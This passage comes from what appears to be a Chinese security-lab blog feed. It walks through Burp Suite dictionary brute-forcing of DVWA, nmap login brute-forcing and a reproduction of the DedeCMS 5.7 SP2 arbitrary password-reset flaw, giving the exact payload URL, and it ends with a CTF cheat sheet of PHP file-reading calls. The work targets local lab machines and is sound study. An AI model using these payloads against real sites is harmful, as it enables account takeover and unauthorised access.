利用人们平时常用的词、句破译，如果说暴力破解是一个一个的尝试那么字典破译就是利用人们习惯用人名、地名或者常见的词语设置成密码的习惯进行破译。字典破译速度比暴力破译更快但是有时候密码设置中包含了没有字典库中的词句就无法破解出来了，因此有好的字典是关键。</p><p>以*****为目标网站，构造字典（wordlist），其中包含你的正确密码，利用burpsuite进行字典攻击，实施字典攻击，你是如何判断某个密码为破解得到的正确密码，截图。</p></li></ul><blockquote><p>这里使用Metasploitable2里的DVWA靶场</p><p>1.打开Metasploitable2虚拟机</p><p>2.在kali的火狐浏览器上方地址栏输入Metasploitable2的IP，选择DVWA</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124193443274.png" alt="image-20211124193443274"></p><blockquote><p>登录账号密码为admin&#x2F;password</p><p>登录后选择Brute Force</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124194538283.png" alt="image-20211124194538283"></p><blockquote><p>原本的账号密码为admin&#x2F;password，登录成功后是这样的</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124194701364.png" alt="image-20211124194701364"></p><blockquote><p>登录不成功是这样的</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124194800988.png" alt="image-20211124194800988"></p><blockquote><p>不会使用burpsuite的先看看<a href="https://www.bilibili.com/video/BV1Xy4y1y7Mx?from=search&seid=15882274739572418192&spm_id_from=333.337.0.0">这个</a>选择性观看即可</p><p>一般情况下，我们是不知道账号密码的，所以我们需要爆破，爆破需要字典，字典可自己收集或去下载</p><p>打开代理，在登录页面随便输入密码(假设已经知道账号为admin),点击登录，抓包成功，把它发送到爆破功能模块intruder</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124200639770.png" alt="image-20211124200639770"></p></blockquote><blockquote><p>选择要爆破的部分即密码，然后点击<code>add$</code> </p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124201239679.png" alt="image-20211124201239679"></p><blockquote><p>导入字典，开始爆破</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124201552140.png" alt="image-20211124201552140"></p><blockquote><p>点击Length,发现有返回长度不一样的，大概率是正确的密码</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124202556893.png" alt="image-20211124202556893"></p><p>爆破成功，密码为password</p><ul><li><p>4、MD5破解：</p><p>  SqlMap得到某数据库用户表信息，用户口令的MD5值为7282C5050CFE7DF5E09A33CA456B94AE那么，口令的明文是什么？（提示：MD5值破解）</p><blockquote><p><a href="https://pmd5.com/">解密网站</a></p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124203226749.png" alt="image-20211124203226749"></p></li><li><p>5、John the Ripper的作用是什么？</p></li></ul><blockquote><p>John 是一款老牌的暴力破解密码的工具，拥有自带的字典，可以用来爆破一些简单的弱口令密码</p></blockquote><ul><li><p>思考问题： </p><ul><li>1、 谈谈如何防止ARP攻击。</li></ul><blockquote><ul><li>静态绑定IP地址和MAC地址</li><li>双绑措施，在路由器和终端上都进行IP-MAC绑定的措施，它可以对ARP欺骗的两边，伪造网关和截获数据，都具有约束的作用。这是从ARP欺骗原理上进行的防范措施，也是最普遍应用的办法。它对付最普通的ARP欺骗是有效的</li><li>安装 ARP 防火墙</li></ul></blockquote><ul><li>2、 安全的密码（口令）应遵循的原则。</li></ul><blockquote><ul><li>不能是弱密码（如123456、admin、root、88888888）</li><li>不要带有自己的生日或者名字缩写等容易被社工到的信息，可能会被组合成密码字典进行爆破</li></ul></blockquote><ul><li><p>3、 谈谈字典攻击中字典的重要性。</p><blockquote><ul><li>一个弱口令字典常常是打开渗透突破口的第一步</li><li>通过社会工程学组合而成的字典杀伤力很大，能提高密码爆破的成功率</li><li>一些可以用来 fuzzing 的字典可以测试网站的 waf ，比如过滤掉了哪些字符串</li></ul></blockquote></li></ul></li></ul><h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>本次实验最重要的就是学到了 ARP 协议和 ARP 欺骗，以前只是听说过，这回仔细找资料并且动手实践了，其次还明白了密码的重要性，最后是对 Wireshark 软件的使用更加熟练了一些，流量分析也学到了不少简练的操作</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedecms5.7 sp2前台修改任意用户密码漏洞复现</title>
      <link href="/2021/11/22/dedecms5-7-sp2%E5%89%8D%E5%8F%B0%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/11/22/dedecms5-7-sp2%E5%89%8D%E5%8F%B0%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="dedecms5-7-sp2前台修改任意用户密码漏洞复现"><a href="#dedecms5-7-sp2前台修改任意用户密码漏洞复现" class="headerlink" title="dedecms5.7 sp2前台修改任意用户密码漏洞复现"></a>dedecms5.7 sp2前台修改任意用户密码漏洞复现</h1><p><img src="https://img-blog.csdnimg.cn/20200708203502702.gif" alt="20200708203502702"></p><h2 id="复现前的准备"><a href="#复现前的准备" class="headerlink" title="复现前的准备"></a>复现前的准备</h2><p>下载dedecms5.7 sp2,本人复现用的是UTF8版本的。</p><p><a href="https://www.xiuzhanwang.com/dedecms_az/1749.html">传送门</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122223938824.png" alt="image-20211122223938824"></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>phpstudy<br>burp Suite</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>首先在本地搭建这个cms,使用phpstudy</p><p>把解压后的文件丢进phpstudy的www目录下，可改一下文件夹名，这里改成了dedecms</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122225526149.png" alt="image-20211122225526149"></p><p>根据文件下的docs&#x2F;readme.txt的要求配置环境，然后打开服务，根据提示进行安装</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122224739581.png" alt="image-20211122224739581"></p><p>安装事需要到数据库，直接在phpstudy创建</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122225037921.png" alt="image-20211122225037921"></p><p>安装成功后进入后台&#x2F;dedecms&#x2F;uploads&#x2F;dede&#x2F;index.php，进行如下设置</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122230017391.png" alt="image-20211122230017391"></p><p>然后访问&#x2F;dedecms&#x2F;uploads&#x2F;member&#x2F;index.php点击注册</p><p>这里注册两个账号（不要设置安全问题）</p><p>受害用户  text&#x2F;123456</p><p>攻击者   hacher&#x2F;123456</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122230934064.png" alt="image-20211122230934064"></p><p>站在攻击者的角度，攻击者是不知道受害用户的密码的，现在的目的是登录受害用户的账号</p><p>现在先登录攻击者账号再将URL中member后的内容改为resetpassword.php?dopost&#x3D;safequestion&amp;safequestion&#x3D;0.0&amp;safeanswer&#x3D;&amp;id&#x3D;3</p><p>上图的mid即为id,hacker账号的mid为3，所以url后面填写id&#x3D;3 </p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122230838209.png" alt="image-20211122230838209"></p><p>访问<a href="http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=3">http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=3</a></p><p>用burp Suite抓包，我在chrome浏览器抓不到本地的包，所以转用火狐，火狐抓本地的包需要改一些设置<a href="https://blog.csdn.net/XavierDarkness/article/details/91410910">传送门</a></p><p>抓到包后发给repeater,进行重放</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122232233520.png" alt="image-20211122232233520"></p><p>把id改一下，要不得不到红圈得链接</p><p><a href="http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=f2O1mLr8">http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=f2O1mLr8</a></p><p>把没用得参数<code>amp;</code>去除，得到</p><p><a href="http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&id=2&key=f2O1mLr8">http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=f2O1mLr8</a></p><p>直接访问这个链接就可以改密码了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122232631788.png" alt="image-20211122232631788"></p><p>修改密码后成功登录</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122232855916.png" alt="image-20211122232855916"></p><p>把<a href="http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&id=2&key=f2O1mLr8%E7%9A%84id%E7%9A%84%E5%80%BC%E6%94%B9%E6%88%90%E5%85%B6%E4%BB%96%E7%9A%84%EF%BC%8C%E5%B0%B1%E8%83%BD%E6%94%B9%E5%85%B6%E4%BB%96%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E4%BA%86%EF%BC%8C%E5%8C%85%E6%8B%ACadmin%EF%BC%88id=1%EF%BC%89">http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=f2O1mLr8的id的值改成其他的，就能改其他其他用户的密码了，包括admin（id=1）</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122233053082.png" alt="image-20211122233053082"></p><p>复现结束。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>刚刚使用的payload是<code>http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=f2O1mLr8</code> </p><p>可以看出该漏洞出现在member目录下的resetpassword.php文件里</p><p>根据网上的分析，出现漏洞的原因是<code>前台resetpassword.php中对接受的safeanswer参数类型比较不够严格，遭受弱类型比较攻击</code></p><p>打开文件，查看漏洞出现位置</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211123210547435.png" alt="image-20211123210547435"></p><p>我们构造payload时有dopost&#x3D;getpasswd</p><p>所以能够满足<code>$dopost==&quot;safequestion&quot;</code>,进入了下面的赋值和判断</p><pre><code>if(empty($safequestion)) $safequestion = &#39;&#39;;if(empty($safeanswer)) $safeanswer = &#39;&#39;;if($row[&#39;safequestion&#39;] == $safequestion &amp;&amp; $row[&#39;safeanswer&#39;] == $safeanswer)    &#123;        sn($mid, $row[&#39;userid&#39;], $row[&#39;email&#39;], &#39;N&#39;);        exit();    &#125;    else    &#123;        ShowMsg(&quot;对不起，您的安全问题或答案回答错误&quot;,&quot;-1&quot;);        exit();    &#125;</code></pre><p>就是这里的判断出现了问题，由网上的文章了解到在dedecms的数据库中，如果用户没有设置安全问题则数据库里存储的safequestion默认为”0”，safeanswer默认为’null’。因为在PHP的弱比较中<code>&#39;&#39;和NULL</code>的比较返回的是true</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211123213118407.png" alt="image-20211123213118407"></p><p>因为使用了不够严谨的 &#x3D;&#x3D; 进行了比较，两个等号是弱比较，导致if语句的条件为真，就会进入分支，进入sn函数</p><p>sn函数位置<code>/member/inc/inc_pwd_functions.php(150行)</code></p><pre><code>function sn($mid,$userid,$mailto, $send = &#39;Y&#39;)&#123;    global $db;    $tptim= (60*10);    $dtime = time();    $sql = &quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#39;$mid&#39;&quot;;    $row = $db-&gt;GetOne($sql);    if(!is_array($row))    &#123;        //发送新邮件；        newmail($mid,$userid,$mailto,&#39;INSERT&#39;,$send);    &#125;    //10分钟后可以再次发送新验证码；    elseif($dtime - $tptim &gt; $row[&#39;mailtime&#39;])    &#123;        newmail($mid,$userid,$mailto,&#39;UPDATE&#39;,$send);    &#125;    //重新发送新的验证码确认邮件；    else    &#123;        return ShowMsg(&#39;对不起，请10分钟后再重新申请&#39;, &#39;login.php&#39;);    &#125;&#125;</code></pre><p>在sn函数内部，会根据id到pwd_tmp表中判断是否存在对应的临时密码记录，根据结果确定分支，走向newmail函数</p><p>newmail函数位置<code>member/inc/inc_pwd_functions.php(73行)</code></p><pre><code>function newmail($mid, $userid, $mailto, $type, $send)&#123;    global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl;    $mailtime = time();    $randval = random(8);    $mailtitle = $cfg_webname.&quot;:密码修改&quot;;    $mailto = $mailto;    $headers = &quot;From: &quot;.$cfg_adminemail.&quot;\r\nReply-To: $cfg_adminemail&quot;;    $mailbody = &quot;亲爱的&quot;.$userid.&quot;：\r\n您好！感谢您使用&quot;.$cfg_webname.&quot;网。\r\n&quot;.$cfg_webname.&quot;应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为：&quot;.$randval.&quot; 请于三天内登陆下面网址确认修改。\r\n&quot;.$cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;id=&quot;.$mid;    if($type == &#39;INSERT&#39;)    &#123;        $key = md5($randval);        $sql = &quot;INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES (&#39;$mid&#39;, &#39;$userid&#39;,  &#39;$key&#39;, &#39;$mailtime&#39;);&quot;;        if($db-&gt;ExecuteNoneQuery($sql))        &#123;            if($send == &#39;Y&#39;)            &#123;                sendmail($mailto,$mailtitle,$mailbody,$headers);                return ShowMsg(&#39;EMAIL修改验证码已经发送到原来的邮箱请查收&#39;, &#39;login.php&#39;,&#39;&#39;,&#39;5000&#39;);            &#125; else if ($send == &#39;N&#39;)            &#123;                return ShowMsg(&#39;稍后跳转到修改页&#39;, $cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid.&quot;&amp;amp;key=&quot;.$randval);            &#125;        &#125;        else        &#123;            return ShowMsg(&#39;对不起修改失败，请联系管理员&#39;, &#39;login.php&#39;);        &#125;    &#125;    elseif($type == &#39;UPDATE&#39;)    &#123;        $key = md5($randval);        $sql = &quot;UPDATE `#@__pwd_tmp` SET `pwd` = &#39;$key&#39;,mailtime = &#39;$mailtime&#39;  WHERE `mid` =&#39;$mid&#39;;&quot;;        if($db-&gt;ExecuteNoneQuery($sql))        &#123;            if($send == &#39;Y&#39;)            &#123;                sendmail($mailto,$mailtitle,$mailbody,$headers);                ShowMsg(&#39;EMAIL修改验证码已经发送到原来的邮箱请查收&#39;, &#39;login.php&#39;);            &#125;            elseif($send == &#39;N&#39;)            &#123;                return ShowMsg(&#39;稍后跳转到修改页&#39;, $cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid.&quot;&amp;amp;key=&quot;.$randval);            &#125;        &#125;        else        &#123;            ShowMsg(&#39;对不起修改失败，请与管理员联系&#39;, &#39;login.php&#39;);        &#125;    &#125;&#125;</code></pre><p>进入newmail函数后，会因为$type的值进入$type &#x3D;&#x3D; ‘INSERT’这个分支，然后因为($send &#x3D;&#x3D; ‘N’)这个条件为真，通过ShowMsg打印出修改密码的连接，导致漏洞形成</p><p>整个过程大概就是酱紫了，收工。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透实验一</title>
      <link href="/2021/11/16/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
      <url>/2021/11/16/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="网络渗透实验一"><a href="#网络渗透实验一" class="headerlink" title="网络渗透实验一"></a>网络渗透实验一</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li>理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。</li></ul><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul><li>Kali Linux 2</li><li>Windows</li></ul><h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><ul><li>交换网络结构</li></ul><h2 id="实验工具"><a href="#实验工具" class="headerlink" title="实验工具"></a>实验工具</h2><ul><li>Metasploitable2（需自行下载虚拟机镜像）；Nmap（Kali）；WinHex、数据恢复软件等</li></ul><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ul><li>1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。</li></ul><p>谷歌搜索输入：</p><pre><code>&quot;network security&quot; filetype:pdf site:www.mit.edu</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116183551214.png" alt="image-20211116183551214"></p><ul><li><p>2、照片中的女生在哪里旅行？</p><p>截图搜索到的地址信息。<img src="https://raw.githubusercontent.com/todis21/image/main/img/1.jpg" alt="1"></p></li></ul><p>用谷歌地球搜索图中关键词：LeTrentehuit Cafe Brasserie</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116215629733.png" alt="image-20211116215629733"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116215715666.png" alt="image-20211116215715666"></p><p>* </p><p>  <img src="https://raw.githubusercontent.com/todis21/image/main/img/wps84C7.tmp.jpg" alt="img"></p><p>  3、手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535)可以查询手机接入的基站的位置，从而初步确定手机用户的位置。</p><p>  获取自己手机的LAC和CID：</p><p>  Android 获取方法：Android： 拨号*#<em>#4636#</em>#*进入手机信息工程模式后查看</p><p>  iphone获取方法：iPhone：拨号*3001#12345#*进入FieldTest</p><p>  Serving Cell info–&gt;LAC&#x3D;Tracking Area Code –&gt;cellid &#x3D; Cell identity</p><p>  若不能获取，用右图信息。</p><p>  截图你查询到的位置信息。</p><p>用这个网站查询位置:<a href="http://www.minigps.net/map.html">http://www.minigps.net/map.html</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116220552707.png" alt="image-20211116220552707"></p><ul><li>编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。</li></ul><p>解码网站 ：<a href="https://tool.chinaz.com/tools/base64.aspx">https://tool.chinaz.com/tools/base64.aspx</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116220726362.png" alt="image-20211116220726362"></p><ul><li><p>5、地址信息</p><ul><li>5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。</li></ul><p>MAC地址查询网站：<a href="http://www.atoolbox.net/Tool.php?Id=808">http://www.atoolbox.net/Tool.php?Id=808</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116220941713.png" alt="image-20211116220941713"></p><p>ip查物理地址：<a href="https://www.chaipip.com/aiwen.html">https://www.chaipip.com/aiwen.html</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116221807669.png" alt="image-20211116221807669"></p><p>从以上查询结果来看，该用户使用苹果的设备，并且从ip地址可知该设备处在物理地址为：广西壮族自治区 桂林市 七星区</p><ul><li>5.2 访问  <a href="https://whatismyipaddress.com/">https://whatismyipaddress.com</a>   得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116222511356.png" alt="image-20211116222511356"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116222540596.png" alt="image-20211116222540596"></p><pre><code>不相同，因为网站查询到的是公网IP，ipconfig查询到的是内网IP</code></pre><ul><li><p>6、NMAP使用</p><ul><li><p>6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116223014210.png" alt="image-20211116223014210"></p></li></ul><blockquote><p>21端口ftp文件传输协议：</p><p>该协议是Internet文件传送的基础，它由一系列规格说明文档组成，目标是提高文件的共享性，提供非直接使用远程计算机，使存储介质对用户透明和可靠高效地传送数据</p><p>功能：<br>服务器的上传 和下载，Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。用户可以通过它把自己的PC机与世界各地所有运行FTP协议的服务器相连，访问服务器上的大量程序和信息。实现各种操作系统之间的文件交流，建立一个统一的文件传输协议。</p><p>FTP的传输有两种方式：ASCII传输模式和二进制数据传输模式</p></blockquote><blockquote><p>22端口ssh服务:</p><p>在进行数据传输之前，SSH先对联机数据包通过加密技术进行加密处理，加密后在进行数据传输。确保了传递的数据安全。SSH是专为远程登录会话和其他网络服务提供的安全性协议。利用 SSH 协议可以有效的防止远程管理过程中的信息泄露问题，在当前的生产环境运维工作中，绝大多数企业普遍采用SSH协议服务来代替传统的不安全的远程联机服务软件，如telnet(23端口，非加密的)等。</p><p>SSH还能提供类似FTP服务的sftp-server,借助SSH协议来传输数据的.提供更安全的SFTP服务</p></blockquote><blockquote><p>23端口telent远程登录服务</p><p>telnet服务属于典型的客户机&#x2F;服务器模型，当用telnet登录远程计算机的时候，实际上启动了两个程序：运行在本地计算机的telnet客户端程序；运行在登录的远程计算机上的telnet服务程序</p></blockquote><blockquote><p>80端口http服务：</p><p>80端口主要用于WWW(World Wide Web)即万维网传输信息的协议。可以通过HTTP地址(即常说的”网址”)加”:80”来访问网站，因为浏览网页服务默认的端口号都是80，因此只需输入网址即可，不用输入”:80”了。</p></blockquote><ul><li>6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。</li></ul><pre><code>nmap -O 目标ip</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116224619869.png" alt="image-20211116224619869"></p><ul><li><p>6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码。</p><p>首先用nmap自带的脚本进行探测登陆界面，并且知道 dvwa 在 80 端口上，用<code>http-auth-finder</code>脚本探测站点上的登录授权页面，发现<code>/dvwa/login.php</code></p><pre><code>nmap -p 80 --script http-auth-finder 目标ip</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116230430137.png" alt="image-20211116230430137"></p><p>找到和登录授权有关的页面，尝试使用类似于http-form-brute的脚本爆破出一些账户密码，http-form-brute 传参–script-args&#x3D;http-form-brute.path&#x3D;&#x2F;dvwa&#x2F;login.php 目标ip   进行爆破</p><pre><code>nmap -p 80 --script http-form-brute --script-args=http-form-brute.path=/dvwa/login.php 目标ip</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211117155603194.png" alt="image-20211117155603194"></p><p>得到账号：admin密码：password</p></li><li><p>6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。</p></li></ul></li></ul><blockquote><p>蠕虫病毒会通过远程服务器和自身爬虫功能收集局域网内的IP列表，然后对其中的多个服务端口发起攻击，包括RPC服务(135端口)、SQLServer服务(1433端口)、FTP服务(21端口)，同时还会通过 “永恒之蓝”漏洞，入侵445端口，攻击电脑。</p><p>该病毒针对企业不便关闭的多个常用端口进行攻击，并且利用了局域网电脑中普遍未修复的”永恒之蓝”漏洞，一旦任何一台电脑被该病毒感染，将意味着局域网内所有电脑都面临被感染的风险，尤其给政企机构用户造成极大威胁。</p><p>如果病毒成功入侵或攻击端口，就会从远程服务器下载病毒代码，进而横向传播给局域网内其他电脑。同时，该病毒还会在被感染电脑中留下后门病毒，以准备进行后续的恶意攻击，不排除未来会向用户电脑传播更具威胁性病毒的可能性，例如勒索病毒等</p></blockquote><ul><li>7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题</li></ul><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211117155503789.png" alt="image-20211117155503789"></p><p>利用 ZoomEye 搜索到的西门子公司工控设备，其 IP 、开放的端口号、国家等信息暴露出来，可能导致某些服务（例如 SSH、telnet等）被爆破弱口令，进而导致正常服务被破坏</p><ul><li><p>8、Winhex简单数据恢复与取证</p><ul><li><p>8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。</p><p>该图片的文件头出错，正常的.JPG文件头是：FF D8 FF E0,用winhex打开该图片，修改文件头即可恢复</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211117160704969.png" alt="image-20211117160704969"></p><pre><code>     恢复后的图片：</code></pre></li></ul></li></ul><p>​<img src="https://raw.githubusercontent.com/todis21/image/main/img/elephant.jpg" alt="elephant"></p><ul><li><ul><li>8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。</li></ul><p>用winhex打开，隐藏的信息在最后面：<code>tom is the killer</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211117161338447.png" alt="image-20211117161338447"></p></li><li><ul><li>8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211117163522285.png" alt="image-20211117163522285"></p><ul><li><p>9。实验总结</p><p>通过本次实验学习到了一些被动扫描的技巧，包括照片定位、通过MAC查询设备以及如何更好的利用搜索引擎，还学习到了 Nmap 的主动扫描技巧，还有一些对文件隐写的常用操作，比如修复损坏的文件头，查看隐藏在文件里的二进制信息等</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花式读取文件</title>
      <link href="/2021/11/07/%E8%8A%B1%E5%BC%8F%E8%AF%BB%E6%96%87%E4%BB%B6/"/>
      <url>/2021/11/07/%E8%8A%B1%E5%BC%8F%E8%AF%BB%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="花式读取文件"><a href="#花式读取文件" class="headerlink" title="花式读取文件"></a>花式读取文件</h1><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>hightlight_file($filename);</p><p>show_source($filename);</p><p>print_r(php_strip_whitespace($filename));</p><p>print_r(file_get_contents($filename));</p><p>readfile($filename);</p><p>print_r(file($filename)); &#x2F;&#x2F; var_dump</p><p>fread(fopen($filename,”r”), $size);</p><p>include($filename); &#x2F;&#x2F; 非php代码</p><p>include_once($filename); &#x2F;&#x2F; 非php代码</p><p>require($filename); &#x2F;&#x2F; 非php代码</p><p>require_once($filename); &#x2F;&#x2F; 非php代码</p><p>print_r(fread(popen(“cat flag”, “r”), $size));</p><p>print_r(fgets(fopen($filename, “r”))); &#x2F;&#x2F; 读取一行</p><p>fpassthru(fopen($filename, “r”)); &#x2F;&#x2F; 从当前位置一直读取到 EOF</p><p>print_r(fgetcsv(fopen($filename,”r”), $size));</p><p>print_r(fgetss(fopen($filename, “r”))); &#x2F;&#x2F; 从文件指针中读取一行并过滤掉 HTML 标记</p><p>print_r(fscanf(fopen(“flag”, “r”),”%s”));</p><p>print_r(parse_ini_file($filename)); &#x2F;&#x2F; 失败时返回 false , 成功返回配置数组</p><h2 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h2><p>print_r(glob(“*”)); &#x2F;&#x2F; 列当前目录</p><p>print_r(glob(“&#x2F;*”)); &#x2F;&#x2F; 列根目录 print_r(scandir(“.”));</p><p>print_r(scandir(“&#x2F;“));</p><p>$d&#x3D;opendir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d))){echo”$f\n”;}</p><p>$d&#x3D;dir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;$d-&gt;read())){echo$f.”\n”;}</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit的简单应用</title>
      <link href="/2021/11/06/Metasploit%E7%9A%84%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8/"/>
      <url>/2021/11/06/Metasploit%E7%9A%84%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8/</url>
      
